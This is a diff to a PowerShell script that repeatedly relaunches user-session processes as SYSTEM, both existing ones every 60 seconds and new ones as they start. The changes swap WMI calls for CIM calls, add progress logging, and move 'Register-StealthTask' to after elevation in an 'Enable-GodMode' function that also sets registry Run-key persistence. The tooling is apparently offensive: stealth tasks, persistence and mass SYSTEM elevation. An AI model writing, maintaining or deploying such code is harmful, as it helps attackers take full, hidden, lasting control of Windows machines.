@@ -2260,12 +2260,14 @@ function Elevate-Process {
 function Test-SystemProcessExists {
     param([string]$ProcessName)
     try {
-        $procs = Get-WmiObject Win32_Process -Filter "Name='$ProcessName'" -ErrorAction SilentlyContinue
-        foreach ($p in $procs) {
-            try {
-                $owner = $p.GetOwner()
-                if ($owner.User -eq "SYSTEM") { return $true }
-            } catch { }
+        $procs = Get-CimInstance Win32_Process -Filter "Name='$ProcessName'" -ErrorAction SilentlyContinue
+        if ($procs) {
+            foreach ($p in $procs) {
+                try {
+                    $owner = Invoke-CimMethod -InputObject $p -MethodName GetOwner -ErrorAction SilentlyContinue
+                    if ($owner.User -eq "SYSTEM") { return $true }
+                } catch { }
+            }
         }
     } catch { }
     return $false
@@ -2274,13 +2276,22 @@ function Test-SystemProcessExists {
 function Invoke-ExistingProcessElevation {
     Write-Log -Message "Elevating existing user-session processes to SYSTEM..." -Type "INFO" -Color Gray
     $CriticalProcs = @("csrss.exe", "lsass.exe", "services.exe", "smss.exe", "winlogon.exe", "wininit.exe", "svchost.exe", "taskhostw.exe", "sihost.exe", "dwm.exe", "fontdrvhost.exe", "Memory Compression", "Registry", "System", "Secure System", "powershell.exe", "pwsh.exe", "cmd.exe", "conhost.exe")
-    $ExistingProcesses = Get-WmiObject Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -gt 0 -and $_.ExecutablePath -and $_.ExecutablePath -like "*.exe" }
+    try {
+        $ExistingProcesses = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -gt 0 -and $_.ExecutablePath -and $_.ExecutablePath -like "*.exe" }
+    } catch {
+        Write-Log -Message "Get-CimInstance failed, falling back to Get-WmiObject: $_" -Type "WARN" -Color Yellow
+        $ExistingProcesses = Get-WmiObject Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -gt 0 -and $_.ExecutablePath -and $_.ExecutablePath -like "*.exe" }
+    }
     $total = ($ExistingProcesses | Measure-Object).Count
     $count = 0
+    $skipped = 0
     foreach ($proc in $ExistingProcesses) {
         $count++
+        if ($count % 5 -eq 0 -or $count -eq $total) {
+            Write-Log -Message "Elevating process $count of $total ($skipped skipped)..." -Type "INFO" -Color Gray
+        }
         $procName = [System.IO.Path]::GetFileName($proc.ExecutablePath)
-        if ($CriticalProcs -contains $procName) { continue }
+        if ($CriticalProcs -contains $procName) { $skipped++; continue }
         $path = $proc.ExecutablePath
         $arguments = ""
         if ($proc.CommandLine) {
@@ -2299,7 +2310,7 @@ function Invoke-ExistingProcessElevation {
         }
         Elevate-Process -Path $path -Arguments $arguments
     }
-    Write-Log -Message "Existing process elevation complete." -Type "INFO" -Color Gray
+    Write-Log -Message "Existing process elevation complete ($count total, $skipped critical skipped)." -Type "INFO" -Color Gray
 }
 
 function Start-Monitoring {
@@ -2363,7 +2374,7 @@ function Start-Monitoring {
             # --- Periodic Existing Process Elevation: Re-elevate every 60 seconds ---
             if ((Get-Date) - $lastExistingElevate -gt [TimeSpan]::FromSeconds(60)) {
                 $lastExistingElevate = Get-Date
-                $ExistingProcesses = Get-WmiObject Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -gt 0 -and $_.ExecutablePath -and $_.ExecutablePath -like "*.exe" }
+                $ExistingProcesses = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -gt 0 -and $_.ExecutablePath -and $_.ExecutablePath -like "*.exe" }
                 foreach ($proc in $ExistingProcesses) {
                     $procName = [System.IO.Path]::GetFileName($proc.ExecutablePath)
                     if ($CriticalProcs -contains $procName) { continue }
@@ -2394,7 +2405,7 @@ function Start-Monitoring {
             # --- New Process Elevation ---
             # Only elevate processes in user sessions (SessionId > 0) to avoid duplicating system processes
             $Now = Get-Date
-            $newProcesses = Get-WmiObject Win32_Process -ErrorAction SilentlyContinue | Where-Object {
+            $newProcesses = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
                 try {
                     $_.SessionId -gt 0 -and
                     $_.CreationDate -and
@@ -2467,9 +2478,9 @@ function Enable-GodMode {
 
     if (-not (Test-Path $GodModeFlagRegPath)) { New-Item -Path $GodModeFlagRegPath -Force | Out-Null }
     Set-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -Value 1 -Force -ErrorAction SilentlyContinue
-    Register-StealthTask
     Enable-DangerousMode
     Invoke-ExistingProcessElevation
+    Register-StealthTask
 
     # --- Registry Persistence (Run keys) ---
     Write-Log -Message "Setting registry persistence keys..." -Type "INFO" -Color Gray
